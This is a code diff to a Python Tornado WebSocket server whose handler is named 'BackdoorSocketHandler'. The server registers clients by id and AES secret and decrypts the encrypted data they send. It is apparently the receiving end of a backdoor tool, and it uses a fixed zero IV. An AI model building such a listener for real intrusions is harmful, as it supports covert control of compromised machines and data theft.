@@ -10,11 +10,22 @@ from Crypto.Cipher import AES
 __author__ = 'nekocode'
 
 
-class Client:
-    def __init__(self, sercret):
-        self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
+class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
+    clients = set()
+
+    def data_received(self, chunk):
+        pass
+
+    @staticmethod
+    def send_to_all(message):
+        for c in BackdoorSocketHandler.clients:
+            c.write_message(json.dumps(message))
+
+    def __init__(self, application, request, **kwargs):
+        tornado.websocket.WebSocketHandler.__init__(self, application, request, **kwargs)
+        self.ID = None
         self.IV = '\0' * AES.block_size
-        self.SECRET = sercret
+        self.SECRET = None
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
@@ -26,36 +37,24 @@ class Client:
         plain = decryptor.decrypt(b64decode(ciphertext))
         return plain
 
-
-class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
-    clients = set()
-
-    def __int__(self):
-        pass
-
-    def data_received(self, chunk):
-        pass
-
-    @staticmethod
-    def send_to_all(message):
-        for c in BackdoorSocketHandler.clients:
-            c.write_message(json.dumps(message))
-
     def open(self):
-        self.write_message('Welcome to WebSocket')
-        print("open")
-
-        BackdoorSocketHandler.send_to_all(str(id(self)) + ' has joined')
-        BackdoorSocketHandler.clients.add(self)
+        pass
 
     def on_message(self, message):
-        print message
+        msg = json.loads(message)
+        if 'id' in msg:
+            self.ID = msg['id']
+            self.SECRET = b64decode(msg['secret'])
+            BackdoorSocketHandler.clients.add(self)
+            print 'new client'
+
+        if self.ID:
+            if 'data' in msg:
+                data = self.decrypt(msg['data'])
+                print data
 
     def on_close(self):
-        print("close")
-
         BackdoorSocketHandler.clients.remove(self)
-        BackdoorSocketHandler.send_to_all(str(id(self)) + ' has left')
 
 
 def run_server():
@@ -69,3 +68,4 @@ def run_server():
 
 if __name__ == '__main__':
     run_server()
+
